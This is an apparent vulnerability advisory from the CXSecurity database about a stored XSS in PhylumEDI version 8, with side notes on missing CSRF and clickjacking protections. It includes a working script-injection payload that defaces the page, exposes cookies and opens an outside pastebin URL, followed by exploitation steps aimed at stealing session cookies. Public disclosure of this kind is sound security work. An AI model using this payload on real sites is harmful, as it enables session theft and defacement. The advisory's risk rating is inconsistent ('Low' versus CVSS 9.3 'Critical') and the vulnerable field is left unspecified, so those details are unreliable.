---
title: PhylumEDI - Session Stored XSS to Open Redirect with CSRF
url: https://cxsecurity.com/issue/WLB-2026090010
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-09-26
fetch_date: 2026-09-27T07:24:26.783491
---

# PhylumEDI - Session Stored XSS to Open Redirect with CSRF

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **PhylumEDI - Session Stored XSS to Open Redirect with CSRF** **2026.09.26**  Credit:  **[34zY / Hamza TERIR](https://cxsecurity.com/author/34zY%2B/%2BHamza%2BTERIR%2B/1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-79, CWE-601, CWE-352, CWE-693](https://cxsecurity.com/cwe/CWE-79%2C%20CWE-601%2C%20CWE-352%2C%20CWE-693 "Click to see CWE-79, CWE-601, CWE-352, CWE-693")** | |

PhylumEDI version [8] (discovered 2023) contains a Stored XSS vulnerability that persists malicious scripts in user session data or user profiles. Unlike reflected XSS, stored XSS affects all users who view the contaminated data, and the payload executes every time the page is loaded, even after the attacker closes their browser.
Affected component:
Product: PhylumEDI
Version: [8] (2023)
Vulnerable input: User profile field / Session storage / Comment field (exact location TBD)
Year discovered: 2023
Vulnerability: Session Stored XSS
Malicious JavaScript is stored in the application's session data or database. Every time the affected user (or other users viewing that data) loads the page, the script executes.
Reproduction - Alert Cookie
Payload (stored in user profile/session):
'></script><html style='background-color: black;'><br><br><br><br><br><br><br><br><br><br><br><br><h1 style='color: red;'>Hamza was here</h1><script>console.log(eval(1));alert(document.cookie)</script><img src='http://url.to.file.which/not.exist' onerror=window.open('https://pastebin.com/raw/U5R1uDNW','xss','height=500,width=500');><!--
Attack Flow:
1. Attacker logs into PhylumEDI account
2. Navigates to profile/comment/message input field
3. Injects XSS payload into field
4. Saves profile / posts comment
5. Payload stored in database
6. Victim logs into PhylumEDI
7. Views attacker's profile / comment thread
8. JavaScript executes in victim's browser
9. Victim's session cookie stolen + page defaced + redirected
Result:
- Page defaced (black background, red text)
- Victim's cookie displayed in alert
- New window opens to attacker-controlled site
- All users viewing the contaminated data affected
Full reproduction steps:
1. Setup: Attacker has PhylumEDI account (or can create one). Identify input field that accepts HTML/JS (profile, bio, comment, etc.)
2. Injection: Insert XSS payload into field, save / submit form
3. Verification: Log out of attacker account, log in as different user (or browse as unauthenticated), navigate to attacker's profile / comment thread, observe script execution, defacement, redirect
4. Impact assessment: Every user who views the contaminated page experiences XSS. Payload persists until manually removed from database. No rate limiting = mass credential theft possible
Additional vulnerabilities detected:
- CSRF: No CSRF token on profile edit form (x2 instances)
- Clickjacking: No X-Frame-Options header (page can be framed)
Impact:
Confidentiality: Session cookies from ALL users who view contaminated content stolen
Integrity: Malicious content persists indefinitely, affects all users
Availability: Page defacement, mass redirect (DoS-like effect)
Privilege escalation: If admin views contaminated data, admin cookies stolen
Persistence: Unlike reflected XSS, attacker doesn't need to re-send link
CVSS Estimate: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H ~ 9.3 (Critical)
Higher than reflected XSS because: (1) Requires only user-level access to inject, (2) Affects ALL users viewing data, (3) Persists in database indefinitely, (4) Harder to detect/remediate
Discovered: 2023 (PhylumEDI version [8])
Status: Unpatched (vendor non-responsive)
Severity: CRITICAL (Stored XSS)

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026090010)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top